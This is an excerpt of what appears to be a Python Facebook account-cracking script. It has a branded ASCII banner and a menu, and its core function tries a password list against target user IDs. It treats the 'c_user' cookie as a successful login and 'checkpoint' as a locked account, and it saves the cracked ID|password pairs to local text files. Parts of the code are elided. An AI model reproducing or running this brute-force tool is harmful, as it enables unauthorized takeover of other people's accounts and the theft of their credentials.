...
logo=("""\033[1;97m
dP""b8  dP"Yb   dP""b8 88  dP 88""Yb  dP"Yb     db     dP""b8 88  88 
dP   `" dP   Yb dP   `" 88odP  88__dP dP   Yb   dPYb   dP   `" 88  88 
Yb      Yb   dP Yb      88"Yb  88"Yb  Yb   dP  dP__Yb  Yb      888888 
 YboodP  YbodP   YboodP 88  Yb 88  Yb  YbodP  dP""""Yb  YboodP 88  88
\33[1;37m----------------------------------------------
→   Owner      :  Shahriar Ahmed Ekab 
→   Facebook   :  Kingly Ekab
→   Github     :  EKAB 172
...
def menu():
			...
			if ekab in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/EKAB.OFFICIAL.ACCOUNT');menu()
			elif ekab in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mEKAB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[EKAB-OK] '+ids+' | '+pas+'\033[1;32m')
				open('/sdcard/EKAB-OK.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					
					print('\33[1;31m[EKAB-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/EKAB-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[EKAB-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/EKAB-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[EKAB-OK] '+cid+' | '+ps+'\033[1;32m')
				open('EKAB-OK.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[EKAB-CP] '+cid+' | '+ps+'\33[0;97m')
				open('EKAB-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
